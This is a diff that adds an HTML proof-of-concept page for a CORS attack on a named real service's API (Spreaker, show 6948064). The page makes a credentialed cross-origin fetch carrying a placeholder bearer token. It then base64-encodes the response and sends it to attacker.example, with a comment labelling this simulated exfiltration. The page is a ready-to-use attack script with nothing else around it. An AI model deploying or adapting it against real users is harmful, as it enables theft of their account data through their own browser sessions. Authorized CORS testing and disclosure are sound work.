@@ -1,8 +1,41 @@
-fetch("https://api.spreaker.com/v2/shows/6948064/features", {
-  headers: {
-    "Authorization": "Bearer TOKEN"
-  },
-  credentials: "include"
-})
-.then(r => r.text())
-.then(console.log)
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+
+<h2>CORS Test - Spreaker API</h2>
+
+<button onclick="run()">Run PoC</button>
+
+<pre id="out"></pre>
+
+<script>
+function run() {
+
+  fetch("https://api.spreaker.com/v2/shows/6948064/features?c=en_US", {
+    method: "GET",
+    headers: {
+      "Authorization": "Bearer TOKEN"
+    },
+    credentials: "include"
+  })
+  .then(r => r.text())
+  .then(data => {
+    console.log(data);
+    document.getElementById("out").innerText = data;
+
+    // optional: simulate data exfiltration
+    fetch("https://attacker.example/log?data=" + btoa(data))
+      .catch(() => {});
+  })
+  .catch(err => {
+    console.log("Error:", err);
+  });
+
+}
+</script>
+
+</body>
+</html>
